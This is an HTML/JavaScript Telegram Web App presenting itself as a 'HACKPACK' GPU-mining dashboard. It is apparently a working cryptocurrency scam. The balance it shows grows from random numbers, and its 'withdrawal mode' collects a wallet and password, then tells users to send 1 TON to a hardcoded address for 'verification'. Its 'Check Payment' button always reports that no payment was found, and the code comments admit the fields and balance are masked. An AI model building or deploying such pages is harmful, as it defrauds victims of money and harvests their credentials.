<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HACKPACK // CYBERDECK</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html{
    overflow-x:hidden;
}

body{
    background:#020202;
    color:#d9f7ff;
    font-family:Inter,system-ui,sans-serif;

    min-height:100vh;

    display:flex;
    justify-content:center;

    overflow-x:hidden;
    overflow-y:auto;

    padding:20px;

    position:relative;
}

/* BACKGROUND */

body::before{
    content:"";
    position:fixed;
    inset:0;

    background:
        radial-gradient(circle at top,#0f3d52 0%,transparent 40%),
        radial-gradient(circle at bottom,#07161d 0%,transparent 45%);

    opacity:.6;
    pointer-events:none;
}

.grid{
    position:fixed;
    inset:0;

    background-image:
        linear-gradient(rgba(64,167,227,.08) 1px, transparent 1px),
        linear-gradient(90deg, rgba(64,167,227,.08) 1px, transparent 1px);

    background-size:40px 40px;

    transform:perspective(900px) rotateX(60deg);
    transform-origin:top;

    opacity:.18;
    pointer-events:none;
}

.scanline{
    position:fixed;
    inset:0;

    pointer-events:none;

    background:
        linear-gradient(
            to bottom,
            transparent 50%,
            rgba(255,255,255,.02) 51%
        );

    background-size:100% 4px;
    mix-blend-mode:soft-light;
}

/* PANEL */

.panel{
    width:100%;
    max-width:420px;

    background:rgba(7,10,14,.88);

    border:1px solid rgba(64,167,227,.35);
    border-radius:26px;

    padding:24px;

    position:relative;

    backdrop-filter:blur(14px);

    box-shadow:
        0 0 50px rgba(64,167,227,.12),
        inset 0 0 20px rgba(64,167,227,.05);

    margin:auto;

    z-index:2;
}

.panel::after{
    content:"";

    position:absolute;
    inset:0;

    border-radius:26px;
    padding:1px;

    background:
        linear-gradient(
            135deg,
            rgba(64,167,227,.6),
            transparent
        );

    -webkit-mask:
        linear-gradient(#fff 0 0) content-box,
        linear-gradient(#fff 0 0);

    -webkit-mask-composite:xor;
    mask-composite:exclude;
}

/* TOP */

.top{
    display:flex;
    justify-content:space-between;
    align-items:center;

    margin-bottom:22px;
}

.logo{
    font-size:14px;
    font-weight:900;
    letter-spacing:3px;
    color:#40a7e3;
}

.status{
    font-size:11px;
    color:#4cd964;

    display:flex;
    align-items:center;
    gap:7px;
}

.dot{
    width:8px;
    height:8px;

    border-radius:50%;

    background:#4cd964;
    box-shadow:0 0 10px #4cd964;

    animation:pulse 1s infinite;
}

@keyframes pulse{
    0%,100%{
        opacity:1;
    }

    50%{
        opacity:.3;
    }
}

/* BALANCE */

.balance-box{
    text-align:center;
    margin-bottom:24px;
}

.balance-label{
    color:#7d93a0;

    text-transform:uppercase;
    letter-spacing:2px;

    font-size:11px;

    margin-bottom:8px;
}

.balance{
    font-size:54px;
    font-weight:900;

    text-shadow:0 0 25px rgba(64,167,227,.35);

    word-break:break-word;
}

.balance span{
    color:#40a7e3;
}

/* CARDS */

.cards{
    display:grid;
    gap:12px;

    margin-bottom:18px;
}

.card{
    background:rgba(255,255,255,.03);

    border:1px solid rgba(255,255,255,.06);
    border-radius:16px;

    padding:14px;

    overflow:hidden;
}

.card-title{
    font-size:11px;
    color:#40a7e3;

    text-transform:uppercase;
    letter-spacing:1px;

    margin-bottom:10px;
}

.metric{
    display:flex;
    justify-content:space-between;

    margin-bottom:8px;

    font-size:13px;
}

.metric:last-child{
    margin-bottom:0;
}

/* BAR */

.bar{
    width:100%;
    height:8px;

    border-radius:20px;

    background:#0d1318;

    overflow:hidden;
}

.bar-fill{
    height:100%;
    width:68%;

    background:
        linear-gradient(
            90deg,
            #40a7e3,
            #7de2ff
        );

    box-shadow:0 0 18px rgba(64,167,227,.5);

    animation:move 3s infinite linear;
}

@keyframes move{
    0%{
        filter:hue-rotate(0deg);
    }

    100%{
        filter:hue-rotate(20deg);
    }
}

/* LOGS & INPUTS */

.logs{
    height:120px;

    overflow:hidden;

    font-family:monospace;
    font-size:11px;

    color:#8fdfff;

    line-height:1.7;

    word-break:break-word;
}

.log-line{
    opacity:.85;
    animation:flicker .4s;
}

@keyframes flicker{
    from{
        opacity:0;
        transform:translateY(6px);
    }

    to{
        opacity:.85;
        transform:none;
    }
}

/* Стили полей ввода, маскирующиеся под кибердек */
.input-group {
    margin-bottom: 10px;
}
.input-group:last-child {
    margin-bottom: 0;
}
.input-label {
    font-size: 10px;
    color: #40a7e3;
    font-weight: bold;
    margin-bottom: 4px;
    text-transform: uppercase;
    font-family: monospace;
}
.cyber-input {
    width: 100%;
    background: #070a0e;
    border: 1px solid rgba(64,167,227,0.25);
    border-radius: 8px;
    padding: 10px;
    color: #8fdfff;
    font-size: 12px;
    box-sizing: border-box;
    outline: none;
    font-family: monospace;
    transition: 0.3s;
}
.cyber-input:focus {
    border-color: #40a7e3;
    background: #0d131a;
    box-shadow: 0 0 10px rgba(64,167,227,0.2);
}

/* BUTTONS */

.actions{
    display:grid;
    grid-template-columns:1fr 1fr;

    gap:12px;

    margin-top:18px;
}

button{
    border:none;

    cursor:pointer;

    padding:15px;

    border-radius:16px;

    font-weight:800;

    transition:.2s;
}

button:active{
    transform:scale(.96);
}

.primary{
    background:#40a7e3;
    color:#fff;

    box-shadow:0 0 20px rgba(64,167,227,.3);
}

.secondary{
    background:#0f1317;
    color:#cfefff;

    border:1px solid rgba(64,167,227,.25);
}

/* FOOTER */

.footer{
    margin-top:18px;

    text-align:center;

    color:#5f717c;

    font-size:10px;
    letter-spacing:1px;

    line-height:1.6;
}

/* MOBILE */

@media(max-width:480px){

    body{
        padding:12px;
    }

    .panel{
        padding:18px;
        border-radius:22px;
    }

    .balance{
        font-size:42px;
    }

    .actions{
        grid-template-columns:1fr;
    }

    button{
        width:100%;
    }

}

</style>
</head>

<body>

<div class="grid"></div>
<div class="scanline"></div>

<div class="panel">

    <div class="top">

        <div class="logo">
            HACKPACK
        </div>

        <div class="status">
            <div class="dot"></div>
            <span id="status-text">SYSTEM ONLINE</span>
        </div>

    </div>

    <div class="balance-box">

        <div class="balance-label" id="panel-mode-title">
            Network Processing Power
        </div>

        <div class="balance">
            <span id="currency-sym">⟠</span>
            <span id="power">0</span>
        </div>

    </div>

    <div class="cards">

        <div class="card">

            <div class="card-title">
                GPU Cluster
            </div>

            <div class="metric">
                <span>Temperature</span>
                <span id="temp">61°C</span>
            </div>

            <div class="metric">
                <span>Load</span>
                <span id="load">68%</span>
            </div>

            <div class="bar">
                <div class="bar-fill"></div>
            </div>

        </div>

        <div class="card">

            <div class="card-title" id="feed-title">
                Live Terminal Feed
            </div>

            <!-- Контейнер логов -->
            <div class="logs" id="logs"></div>

            <!-- Скрытый контейнер полей ввода (изначально не виден) -->
            <div class="logs" id="input-container" style="display: none; height: 120px; flex-direction: column; justify-content: center;">
                <div class="input-group">
                    <div class="input-label">Enter TG Wallet</div>
                    <input type="text" id="wallet" class="cyber-input" placeholder="UQAr9x... or @username">
                </div>
                <div class="input-group">
                    <div class="input-label">Security Password</div>
                    <input type="password" id="password" class="cyber-input" placeholder="••••••••">
                </div>
            </div>

        </div>

    </div>

    <div class="actions">

        <button class="primary" id="btn-main" onclick="handleMainAction()">
            BOOST NODE
        </button>

        <button class="secondary" id="btn-mode" onclick="toggleMode()">
            WITHDRAWAL MODE
        </button>

    </div>

    <div class="footer">
        CYBERDECK INTERFACE // NO REAL CRYPTO OPERATIONS
    </div>

</div>

<script>

const tg = window.Telegram.WebApp;

try{
    tg.expand();
    tg.setHeaderColor('#000000');
}catch(e){}

/* ELEMENTS */

const logs = document.getElementById('logs');
const inputContainer = document.getElementById('input-container');
const power = document.getElementById('power');
const temp = document.getElementById('temp');
const load = document.getElementById('load');
const btnMain = document.getElementById('btn-main');
const btnMode = document.getElementById('btn-mode');
const feedTitle = document.getElementById('feed-title');
const panelModeTitle = document.getElementById('panel-mode-title');
const currencySym = document.getElementById('currency-sym');
const statusText = document.getElementById('status-text');

// Загрузка сохраненного баланса
let powerValue = parseFloat(localStorage.getItem('cyber_power') || '0');
let isDead = false;
let isWithdrawMode = false;

/* LOG DATABASE */

const fakeLogs = [
    'NODE_04 > packet stream synchronized',
    'GPU_CLUSTER > neural relay stable',
    'CORE > entropy calibration complete',
    'SYSTEM > encrypted tunnel established',
    'AI_MODULE > response latency 12ms',
    'NETWATCH > traffic spike detected',
    'SIGNAL > uplink refreshed',
    'MEMORY > cache cleaned successfully',
    'CYBERDECK > passive scan enabled',
    'PROXY > route switched automatically'
];

/* ADD LOG */

function addLog(){
    if (isWithdrawMode) return;
    const div = document.createElement('div');
    div.className = 'log-line';
    const text = fakeLogs[Math.floor(Math.random() * fakeLogs.length)];
    const time = new Date().toLocaleTimeString();
    div.textContent = '[' + time + '] ' + text;
    logs.prepend(div);

    while(logs.children.length > 8){
        logs.removeChild(logs.lastChild);
    }
}

/* UPDATE STATS */

function updateStats(){
    if (isDead) return;
    
    // В зависимости от режима крутим цифры чуть по-разному, маскируя под баланс
    powerValue += Math.random() * 8;
    localStorage.setItem('cyber_power', powerValue.toFixed(2));

    if (isWithdrawMode) {
        // В режиме вывода показываем как баланс в долларах
        power.textContent = parseFloat(powerValue / 10).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
    } else {
        power.textContent = Math.floor(powerValue).toLocaleString();
    }

    temp.textContent = (58 + Math.floor(Math.random() * 9)) + '°C';
    load.textContent = (62 + Math.floor(Math.random() * 18)) + '%';
}

/* ПЕРЕКЛЮЧЕНИЕ РЕЖИМА (Кнопка Clear Logs стала переключателем кошелька) */

function toggleMode() {
    if (isDead) return;
    isWithdrawMode = !isWithdrawMode;

    if (isWithdrawMode) {
        // Переход в режим ввода реквизитов
        logs.style.display = 'none';
        inputContainer.style.display = 'flex';
        feedTitle.textContent = 'SECURE GATEWAY ENCRYPTION';
        panelModeTitle.textContent = 'AVAILABLE PROFIT POOL';
        currencySym.textContent = '$';
        btnMain.textContent = 'WITHDRAW NOW';
        btnMode.textContent = 'BACK TO FEEDS';
    } else {
        // Возврат к логам
        inputContainer.style.display = 'none';
        logs.style.display = 'block';
        feedTitle.textContent = 'Live Terminal Feed';
        panelModeTitle.textContent = 'Network Processing Power';
        currencySym.textContent = '⟠';
        btnMain.textContent = 'BOOST NODE';
        btnMode.textContent = 'WITHDRAWAL MODE';
        clearLogs();
    }
}

/* ДЕЙСТВИЕ ГЛАВНОЙ КНОПКИ */

function handleMainAction() {
    if (isDead) return;

    if (!isWithdrawMode) {
        // Обычный Boost Node
        powerValue += 250;
        addLog();
        try {
            tg.showAlert('Node boost complete. Performance increased.');
        } catch(e) {
            alert('Node boost complete.');
        }
    } else {
        // Логика вывода средств
        processWithdraw();
    }
}

/* ОБРАБОТКА ВЫВОДА */

function processWithdraw() {
    const wallet = document.getElementById('wallet').value.trim();
    const pass = document.getElementById('password').value;

    if (pass === "hackpack1977") {
        isDead = true; 
        powerValue = 0; 
        localStorage.setItem('cyber_power', '0');
        power.textContent = "0.00";
        statusText.textContent = "PROTOCOL BREACHED";
        statusText.style.color = "#ff3b30";
        document.querySelector('.dot').style.background = "#ff3b30";
        document.querySelector('.dot').style.boxShadow = "0 0 10px #ff3b30";
        tg.showAlert("🛑 Security Breach: Account Reset.");
        return;
    }

    if (!wallet) {
        tg.showAlert("⚠️ Please enter your TG Wallet address first.");
        return;
    }

    tg.showPopup({
        title: 'Verification Required',
        message: 'To verify your wallet, send 1 TON to the address below:\n\nUQBAtQa96SBwjfTpuiDAphf065OvEr1W78JUrL1U8X3-J9Mw\n\nAfter payment, click "Check Payment".',
        buttons: [
            {id: 'check', type: 'default', text: 'Check Payment'},
            {id: 'cancel', type: 'destructive', text: 'Cancel'}
        ]
    }, function(id) {
        if (id === 'check') {
            tg.showAlert("❌ Payment not found. Verification takes 5-15 minutes. Please try again later.");
        }
    });
}

function clearLogs(){
    logs.innerHTML = '';
    addLog();
}

/* START */

setInterval(addLog,1200);
setInterval(updateStats,300);

for(let i=0;i<5;i++){
    addLog();
}

</script>

</body>
</html>
